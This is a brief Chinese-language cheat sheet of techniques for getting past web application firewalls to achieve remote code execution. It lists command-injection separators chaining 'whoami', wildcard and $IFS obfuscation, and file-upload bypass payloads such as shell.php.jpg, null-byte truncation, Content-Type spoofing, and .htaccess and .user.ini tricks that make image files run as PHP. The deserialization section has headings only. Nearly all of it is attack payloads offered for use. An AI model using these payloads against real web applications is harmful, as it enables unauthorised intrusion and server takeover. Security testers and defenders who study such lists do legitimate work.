# RCE WAF绕过

## 命令注入绕过

### 管道符

```
; whoami
| whoami
& whoami
&& whoami
|| whoami
```

### 编码绕过

```bash
echo "whoami" | bash
$(echo whoami)
```

### 环境变量

```bash
${IFS}
$IFS
```

### 字符串拼接

```bash
/???/wh???mi
/bin/w??am?
```

---

## 文件上传绕过

### 扩展名绕过

```
shell.php
shell.php.jpg
shell.php5
shell.phtml
shell.phar
shell.php%00.jpg
```

### Content-Type绕过

```
Content-Type: image/jpeg
-> image/png, image/gif
```

### 文件头绕过

添加图片文件头到PHP文件

### 00截断

```
shell.php%00.jpg
shell.php .jpg
```

### .htaccess利用

```
AddType application/x-httpd-php .jpg
```

### .user.ini利用

```
auto_prepend_file=shell.jpg
```

---

## 反序列化绕过

### 字符混淆

### 协议流
